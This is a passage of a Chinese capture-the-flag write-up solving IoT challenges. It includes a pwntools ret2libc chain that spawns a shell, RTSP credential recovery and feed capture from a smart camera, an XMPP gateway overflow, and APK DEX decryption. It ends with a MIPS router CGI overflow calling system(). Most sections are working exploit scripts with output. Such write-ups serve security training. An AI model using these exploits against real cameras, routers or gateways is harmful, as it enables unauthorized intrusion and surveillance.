libc = ELF(LIBC, checksec=False)

OFFSET = 72
POP_RDI = 0x4006DB
POP_RSI = 0x4006DD
POP_RDX = 0x4006DF
RET = 0x400511

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(BIN)

io.recvuntil(b"Tell me your plan:")
stage1 = flat({
    OFFSET: [
        POP_RDI, 1,
        POP_RSI, elf.got["write"],
        POP_RDX, 8,
        elf.plt["write"], elf.symbols["vuln"],
    ]
})
io.send(stage1)
io.recvuntil(b"OK\n")
write_leak = u64(io.recvn(8))
libc.address = write_leak - libc.symbols["write"]
log.info("write leak: %#x, libc base: %#x", write_leak, libc.address)

io.recvuntil(b"Tell me your plan:")
bin_sh = next(libc.search(b"/bin/sh\x00"))
stage2 = flat({OFFSET: [RET, POP_RDI, bin_sh, libc.symbols["system"]]})
io.send(stage2)

if args.CMD:
    io.sendline(args.CMD.encode())
    print(io.recvall(timeout=3).decode(errors="replace"))
else:
    io.interactive()
```

## PIoTS

### 摄像头信息探查

题目描述

靶机地址为 `1.95.7.68:2073` 。附件说明智能摄像头存在一个名为 `public-live` 的公开目录，视频流使用 RTSP 协议，目标是截获视频并取得 flag。

分析过程

先直接向附件明确给出的公开流发送 RTSP `OPTIONS` 与 `DESCRIBE` 请求：

```latex
OPTIONS rtsp://1.95.7.68:2073/public-live RTSP/1.0

RTSP/1.0 200 OK
Public: DESCRIBE, ANNOUNCE, SETUP, PLAY, RECORD, PAUSE, GET_PARAMETER, TEARDOWN
Server: gortsplib
```

`DESCRIBE` 返回一个 H.264 视频轨，控制地址为 `rtsp://1.95.7.68:2073/public-live/trackID=0` ，并在 SDP 的 `sprop-parameter-sets` 字段中给出了解码所需的 SPS/PPS。因此可以使用 RTSP-over-TCP：对该轨道执行 `SETUP` ，指定 `Transport: RTP/AVP/TCP;unicast;interleaved=0-1` ，再 `PLAY` 并从 `$` 开头的交错 RTP 包中重组 H.264 NAL 单元。

公开流不是静态画面，OSD 状态栏会循环刷新诊断字段。先以 RTSP 录制 60 秒，再按 1 帧/秒抽取 JPEG；本次共得到 56 张帧图。对全部帧使用 Windows 自带 OCR 识别，并按识别出的 OSD 文本去重，整段录像实际只有 7 种不同的 OSD 状态。这样无需依赖人工恰好暂停在某一帧，能够完整覆盖状态栏的循环内容。

其中 `f_003.jpg` 的 OSD 可识别为：

```latex
REC SMARTCAM HALLWAY-A diag-pass=b64:TlZSLTc3LXJvdGFOZQ= stream=public-live fw=2.4.19 ...
```

其余去重后的状态中还出现了用户名、维护流路径与提示。与解题有关的 OSD 字段如下：

```latex
diag-user=b64:c3ZjX3N5bmM=
diag-pass=b64:TlZSLTc3LXJvdGFOZQ=
diag-path=b64:ZmFjdG9yeS1kZWJ1Zy05ZjZhMmI=
note=maint feed stays on rtsp
```

`diag-pass` 与其他 `diag-xxx` 字段同样来自公开视频画面，而非 RTSP 协议响应头或猜测出的凭据。这使得后续的 Basic 认证参数可以由录制视频独立恢复。

对三段 Base64 解码：

```python
import base64

for value in ("c3ZjX3N5bmM=", "TlZSLTc3LXJvdGFOZQ=", "ZmFjdG9yeS1kZWJ1Zy05ZjZhMmI="):
    print(base64.b64decode(value).decode())
```

输出为：

```latex
svc_sync
NVR-77-rotate
factory-debug-9f6a2b
```

由此可知维护流 URL 为 `rtsp://1.95.7.68:2073/factory-debug-9f6a2b` ，Basic 认证凭据为 `svc_sync:NVR-77-rotate` 。携带认证头执行 `DESCRIBE` 得到成功响应：

```latex
RTSP/1.0 200 OK
Content-Base: rtsp://1.95.7.68:2073/factory-debug-9f6a2b/
Content-Type: application/sdp
Server: gortsplib
```

按相同方式抓取该维护流并解码。一次实际运行写入了 `3652` 个 H.264 NAL 单元，OpenCV 成功解码 `249` 帧；维护画面中央直接显示：

```latex
flag{hidden_rtsp_feed_single_port}
```

复现脚本

以下脚本使用标准库建立 RTSP-over-TCP 会话，解析 RTP 负载中的单 NAL、STAP-A 和 FU-A 三种 H.264 封包方式，并将 SDP 内的 SPS/PPS 与视频 NAL 一同写入 `maintenance.h264` 。运行后可使用支持 H.264 的播放器或 OpenCV 查看画面。

```python
import base64
import re
import socket
import struct
import time

HOST, PORT = "1.95.7.68", 2073
PATH = "factory-debug-9f6a2b"
USER, PASSWORD = "svc_sync", "NVR-77-rotate"
URL = f"rtsp://{HOST}:{PORT}/{PATH}"


def recv_response(sock, buffered):
    while b"\r\n\r\n" not in buffered:
        buffered += sock.recv(8192)
    head, buffered = buffered.split(b"\r\n\r\n", 1)
    text = head.decode("ascii", "replace")
    if not text.startswith("RTSP/1.0 200"):
        raise RuntimeError(text)
    length = next((int(x.split(":", 1)[1]) for x in text.split("\r\n")
                   if x.lower().startswith("content-length:")), 0)
    while len(buffered) < length:
        buffered += sock.recv(8192)
    return text, buffered[:length], buffered[length:]


def request(sock, buffered, cseq, method, uri, extra=""):
    auth = base64.b64encode(f"{USER}:{PASSWORD}".encode()).decode()
    packet = (f"{method} {uri} RTSP/1.0\r\nCSeq: {cseq}\r\n"
              f"Authorization: Basic {auth}\r\n{extra}\r\n").encode()
    sock.sendall(packet)
    return (*recv_response(sock, buffered), cseq + 1)


def unpack_h264(payload, pending):
    if not payload:
        return [], pending
    kind = payload[0] & 0x1f
    if 1 <= kind <= 23:
        return [payload], pending
    if kind == 24:                         # STAP-A
        result, pos = [], 1
        while pos + 2 <= len(payload):
            size = struct.unpack(">H", payload[pos:pos + 2])[0]
            pos += 2
            if pos + size > len(payload):
                break
            result.append(payload[pos:pos + size])
            pos += size
        return result, pending
    if kind == 28 and len(payload) >= 2:   # FU-A
        indicator, header = payload[0], payload[1]
        if header & 0x80:
            pending = bytearray([(indicator & 0xe0) | (header & 0x1f)])
            pending.extend(payload[2:])
        elif pending is not None:
            pending.extend(payload[2:])
        if pending is not None and header & 0x40:
            return [bytes(pending)], None
    return [], pending


sock = socket.create_connection((HOST, PORT), timeout=8)
sock.settimeout(2)
buffered, cseq = b"", 1
_, _, buffered, cseq = request(sock, buffered, cseq, "OPTIONS", URL)
describe, sdp, buffered, cseq = request(
    sock, buffered, cseq, "DESCRIBE", URL, "Accept: application/sdp\r\n"
)
base = next(line.split(":", 1)[1].strip() for line in describe.split("\r\n")
            if line.lower().startswith("content-base:"))
setup, _, buffered, cseq = request(
    sock, buffered, cseq, "SETUP", base + "trackID=0",
    "Transport: RTP/AVP/TCP;unicast;interleaved=0-1\r\n"
)
session = next(line.split(":", 1)[1].strip().split(";", 1)[0]
               for line in setup.split("\r\n") if line.lower().startswith("session:"))
_, _, buffered, cseq = request(sock, buffered, cseq, "PLAY", URL, f"Session: {session}\r\n")

sprop = re.search(rb"sprop-parameter-sets=([^,;]+),([^;\r\n]+)", sdp)
if not sprop:
    raise RuntimeError("missing H.264 SPS/PPS in SDP")

deadline, pending, count = time.monotonic() + 15, None, 0
with open("maintenance.h264", "wb") as out:
    for item in sprop.groups():
        out.write(b"\x00\x00\x00\x01" + base64.b64decode(item))
    while time.monotonic() < deadline:
        try:
            while len(buffered) < 4:
                buffered += sock.recv(8192)
        except socket.timeout:
            continue
        if buffered[0] != 0x24:
            buffered = buffered[buffered.find(b"$"):] if b"$" in buffered else b""
            continue
        channel, length = buffered[1], struct.unpack(">H", buffered[2:4])[0]
        while len(buffered) < length + 4:
            buffered += sock.recv(8192)
        packet, buffered = buffered[4:4 + length], buffered[4 + length:]
        if channel != 0 or len(packet) < 12:
            continue
        offset = 12 + (packet[0] & 0x0f) * 4
        if packet[0] & 0x10:
            offset += 4 + struct.unpack(">H", packet[offset + 2:offset + 4])[0]
        nals, pending = unpack_h264(packet[offset:], pending)
        for nal in nals:
            out.write(b"\x00\x00\x00\x01" + nal)
            count += 1

sock.close()
print(f"wrote {count} H.264 NAL units")
```

运行：

```bash
python3 capture_maintenance.py
```

关键输出为：

```latex
wrote 3652 H.264 NAL units
```

将生成的 `maintenance.h264` 解码为视频帧后，画面中的 flag 为：

```latex
flag{hidden_rtsp_feed_single_port}
```

### promise

题目描述

附件里给了一个二进制 `xmppgw` 和抓包文件 `traffic.pcap` ，远端服务为 `nc 1.95.7.68 2070` 。题目是一个 XMPP 网关，目标是从服务端拿到 flag。

分析过程

先看附件本体。 `file` 和 `checksec` 能确认这个程序是 64 位 ELF， `NX` 开着、 `No PIE` 、 `No canary` ，而且没被 strip，符号都还在，这种题基本就是直接从函数逻辑里找洞。

`strings` 和反汇编很快把主流程摊平了：程序里有 `process_stanza` 、 `handle_cmd` 、 `hex_decode` 、 `handle_body_vuln` 、 `print_flag` 和 `real_print_flag` 这些关键函数。 `process_stanza` 先从 XML 里取出 `<body>` 内容，再判断是 `CMD:` 还是 `HEX:`。 `CMD:` 走普通命令分支， `HEX:` 会先调用 `hex_decode` ，把十六进制字符串还原成原始字节流，然后交给 `handle_body_vuln` 。

真正的洞就在 `handle_body_vuln` 。反汇编里能看到它在栈上分配了 `0x50` 字节，其中局部缓冲区是 `[rbp-0x40]` ，也就是 64 字节。随后程序直接执行

```plain
memcpy(buf, body, raw_len)
```

这里没有做上界检查， `raw_len` 完全由外部输入控制，所以只要 `HEX:` 里给的内容够长，就能把保存的 `rbp` 和返回地址一起覆盖掉。函数后面还会检查前 4 字节是不是 `PING` ，如果是就回一个 `PONG` 。这说明利用时 payload 的开头必须是 `PING` ，否则虽然能溢出，但不会进入目标分支。

再看 `print_flag` 。它在 `0x401669` ，只是一个很短的包装函数，内部直接跳到 `real_print_flag` 。 `real_print_flag` 会打开 `flag.txt` ，读出内容，再通过 `send_reply` 发回客户端。所以利用目标很明确：把 `handle_body_vuln` 的返回地址改成 `0x401669` ，让它返回时跳到 `print_flag` 。

偏移也能从栈帧结构直接算出来。 `buf` 从 `rbp-0x40` 开始，保存的 `rbp` 在 `rbp` ，返回地址在 `rbp+8` ，所以从缓冲区起点到返回地址一共是 72 字节。由于我们必须先放 4 字节 `PING` ，真正需要补的填充是 68 字节，最后再接上 8 字节的小端地址即可。

利用脚本如下：

```python
import socket
import struct
import time

HOST = '1.95.7.68'
PORT = 2070

payload = b'PING' + b'A' * 68 + struct.pack('<Q', 0x401669)
hex_body = payload.hex().encode()
stanza = (
    b"<message from='app@xmpp.local/ios' to='gw@xmpp.local/core' type='chat'>"
    b"<body>HEX:" + hex_body + b"</body></message>\n"
)

with socket.create_connection((HOST, PORT), timeout=5) as s:
    s.settimeout(2)
    print(s.recv(4096).decode('latin1', errors='replace'))
    s.sendall(stanza)
    time.sleep(1)
    out = b''
    while True:
        try:
            d = s.recv(4096)
        except socket.timeout:
            break
        if not d:
            break
        out += d
    print(out.decode('latin1', errors='replace'))
```

脚本发出的 XML stanza 里， `HEX:` 后面放的是上面那个溢出 payload 的十六进制串。远端实际返回了两条消息：先是 `OK:HEX:PONG` ，说明 `PING` 分支被正确触发；随后是 `flag{xmpp_hex_stanza_ret2win}` ，说明返回地址已经成功劫持到 `print_flag` 。

最终结果就是：

`flag{xmpp_hex_stanza_ret2win}`

### 设备管理器

题目描述

附件为 `pack.apk` ，题目说明要求分析 APK 的加壳机制，找到加密资源，逆向解密算法并提取隐藏的 Flag。

分析过程

解压 APK 后可见两个 DEX 文件以及 `assets/encrypted.dex` 。主逻辑位于 `classes2.dex` 的 `com.iot.security.verification.ShellApplication` 类中。 `attachBaseContext()` 调用 `loadEncryptedDex()` ，该函数执行以下操作：

1.  从 Assets 目录读取 `encrypted.dex` ；
2.  将内容写入应用私有目录的 `decrypted.dex` ；
3.  对每个字节执行 `byte ^ 0x5a` ；
4.  使用 `DexClassLoader` 加载处理后的文件。

因此加密算法是逐字节 XOR 常量 `0x5A` 。对附件中的资源解密后，文件开头出现 `dex 035�` ，并且在偏移 `108` 处可以直接读到 ASCII 字符串 `flag{iot_unpack_simple_2025}` 。同一解密结果还包含提示字符串 `This is the real Activity class. Find me in encrypted.dex!`，说明应继续检查该资源而不是停留在壳 APK 中展示的假 Activity 文本。

复现脚本

将 APK 解压出的 `assets/encrypted.dex` 与下列脚本放在同一目录运行：

```python
from pathlib import Path

data = Path("assets/encrypted.dex").read_bytes()
decoded = bytes(byte ^ 0x5A for byte in data)

start = decoded.find(b"flag{")
end = decoded.find(b"}", start) + 1
assert start >= 0 and end > start
print(decoded[start:end].decode("ascii"))
```

运行输出：

```latex
flag{iot_unpack_simple_2025}
```

因此本题最终 flag 为：

```latex
flag{iot_unpack_simple_2025}
```

### GatewayGuard1

题目描述

附件是一个 Android 维护终端 APK。题目说明指出，应用使用运行环境证明，完整会话材料通过内部数据平面分帧注入，控制台只保留不可逆回执；APK 中还有一个使用 AES-CBC/PKCS7 加密的文件。目标是在会话材料被消费前还原完整 flag。

分析过程

解密 APK 中的 DEX

将 APK 当作 ZIP 查看，文件列表为 `AndroidManifest.xml` 、 `resources.arsc` 和 `classes.enc` 等。 `classes.enc` 长度为 6048 字节，题目给出的参数为：

```latex
key = 1234567890abcdef
iv  = abcdef1234567890
mode = AES-CBC
padding = PKCS7
```

解密后检查 PKCS7 填充，最后 4 字节均为 `0x04` ，去除填充后得到以 `dex 035�` 开头的有效 DEX。反汇编该 DEX 可见 `FrameMux` 、 `GatewayService` 、 `GatewaySink` 、 `Guard` 和 `MainActivity` 。

运行环境证明与维护通道

`MainActivity` 的按钮回调先调用 `Guard.inspect(serial)` ，通过后进入 `GatewayService.handshake(serial)` 。默认序列号是 `EDGE-GW-7F31` 。

`Guard.inspect(String)` 会检查调试器、 `/proc/self/maps` 中的 `frida` / `gum-js-loop` ，并要求序列号以 `EDGE-GW-` 开头以及系统属性 `iot.gateway.attested` 等于 `factory` 。普通运行环境会停在环境证明失败；分析时沿着 `handshake` 调用链复现数据平面逻辑即可。

`GatewayService.buildNonce(serial)` 的计算为：

```latex
nonce = (serial.hashCode() XOR 23063) AND 0xffff
```

对 `EDGE-GW-7F31` 按 Java `String.hashCode()` 计算得到 `-605390790` ，所以 `nonce = 8749` 。 `Guard.lease` 在证明通过时返回：

```latex
lease = serial.hashCode() XOR nonce XOR 1295788826
```

结果为 `0x96d6710d` 。 `handshake` 随后反射调用 `FrameMux.dispatch(serial, nonce, lease, frameId)` ，三个帧编号来自 DEX 中的数组： `0` 、 `1` 、 `2` 。

还原三帧数据

`FrameMux.dispatch` 只接受序列号 `EDGE-GW-7F31` ，并根据帧编号返回三组异或混淆字节。解码公式为：

```latex
plain[i] = cipher[i] XOR ((serial[(i + frameId*3) % len(serial)]
                           + nonce + i*29 + frameId*71) AND 0xff)
```

三帧密文分别为：

```latex
14 e2 cf ae b5 71 40 44 2f 1d dd
cd d6 90 7d 74 48 1c 17 fe ca bb
66 6c 43 36 3d 19 cf be 8b 5a 7a 2d 0f 0f ed c9
```

按公式解码，帧 0、帧 1、帧 2 的输出分别是：

```latex
frame 0: b"flag{trace_"
frame 1: b"the_attesta"
frame 2: b"tion_data_plane}"
```

`fill-array-data` 的尾部 `00` 是 DEX 对齐数据，不属于数组元素；前两帧实际长度均为 11 字节。 `GatewaySink.absorb` 会先计算回执，再用 `Arrays.fill` 将输入数组清零，所以必须在消费前截获原始帧。三帧拼接得到完整明文 `flag{trace_the_attestation_data_plane}` 。 `GatewayService.reveal` 中的 `flag{decoy_control_plane}` 是诱饵字符串。

关键脚本

下面脚本完成 DEX 解密、Java 字符串哈希、nonce 计算和三帧解码，依赖 `pycryptodome` ：

```python
from pathlib import Path
from Crypto.Cipher import AES

enc = Path("classes.enc").read_bytes()
plain = AES.new(b"1234567890abcdef", AES.MODE_CBC,
                b"abcdef1234567890").decrypt(enc)
pad = plain[-1]
assert plain[-pad:] == bytes([pad]) * pad
Path("classes.dex").write_bytes(plain[:-pad])

serial = "EDGE-GW-7F31"
h = 0
for ch in serial:
    h = (h * 31 + ord(ch)) & 0xffffffff
if h & 0x80000000:
    h -= 1 << 32
nonce = (h ^ 23063) & 0xffff

frames = [
    bytes.fromhex("14e2cfaeb57140442f1ddd"),
    bytes.fromhex("cdd6907d74481c17fecabb"),
    bytes.fromhex("666c43363d19cfbe8b5a7a2d0f0fedc9"),
]
out = []
for frame_id, cipher in enumerate(frames):
    buf = bytearray()
    for i, value in enumerate(cipher):
        key = (ord(serial[(i + frame_id * 3) % len(serial)])
               + nonce + i * 29 + frame_id * 71) & 0xff
        buf.append(value ^ key)
    print(frame_id, bytes(buf))
    out.append(bytes(buf))
print(b"".join(out))
```

关键输出为：

```latex
0 b'flag{trace_'
1 b'the_attesta'
2 b'tion_data_plane}'
b'flag{trace_the_attestation_data_plane}'
```

最终结果：

```latex
flag{trace_the_attestation_data_plane}
```

### bllbl的路由

题目描述

靶机为 `1.95.7.68:2066` 上的 Polar 路由器 Web 服务。首页 `/admin` 暴露了维护 CGI `/cgi-bin/admin_bllbl.cgi` ，目标是利用该 CGI 获取 flag。

分析过程

访问 CGI 根路径可得到接口说明：

```latex
GET  ?action=download&file=config
GET  ?action=leak
POST ?action=pwn
```

`action=leak` 返回固定的栈缓冲区地址和大小：

```latex
[LEAK] buffer=0x2b2aba58
[INFO] arch=mipsel
[INFO] buf_size=128
```

下载 CGI 二进制后确认其为 MIPS little-endian ELF。 `action=pwn` 读取 POST 数据时把最多 128 字节复制到栈上缓冲区，但没有检查实际长度，覆盖保存的返回地址。结合反汇编可定位到可用的 MIPS 返回链：偏移 `0x84` 覆盖返回地址，使用 `0x42229c` 作为栈整理 gadget，并把 `system` 地址 `0x4093b8` 和命令字符串地址放入后续栈槽。命令字符串放在泄露缓冲区的 `+0xc0` 处，内容为 `cat /flag` 。

下面脚本是本次实际验证成功的最小利用：

```python
import socket
import struct

HOST, PORT = "1.95.7.68", 2066
BUF = 0x2b2aba58          # action=leak 返回的地址
SYSTEM = 0x4093b8         # admin_bllbl.mipsel 中的 system
STACK_GADGET = 0x42229c   # 栈整理/跳转 gadget

payload = bytearray(b"A" * 0xd0)
payload[0x84:0x88] = struct.pack("<I", STACK_GADGET)
payload[0xa0:0xa4] = struct.pack("<I", BUF + 0xc0)
payload[0xac:0xb0] = struct.pack("<I", SYSTEM)
payload[0xb4:0xb8] = struct.pack("<I", SYSTEM)
payload[0xc0:0xca] = b"cat /flag\x00"

sock = socket.create_connection((HOST, PORT), timeout=8)
sock.settimeout(5)
request = (
    f"POST /cgi-bin/admin_bllbl.cgi?action=pwn HTTP/1.0\r\n"
    f"Host: {HOST}\r\nContent-Length: {len(payload)}\r\n\r\n"
).encode() + payload
sock.sendall(request)

response = b""
while True:
    try:
        block = sock.recv(8192)
    except socket.timeout:
        break
    if not block:
        break
    response += block
print(response.decode(errors="replace"))
```

运行结果中包含：

```latex
[DEBUG] Buffer at: 0x2b2aba58
[+] Copy complete.
flag{4ce16de763bfbc99af1e203273f1a6b5}
```

因此本题最终 flag 为 `flag{4ce16de763bfbc99af1e203273f1a6b5}` 。
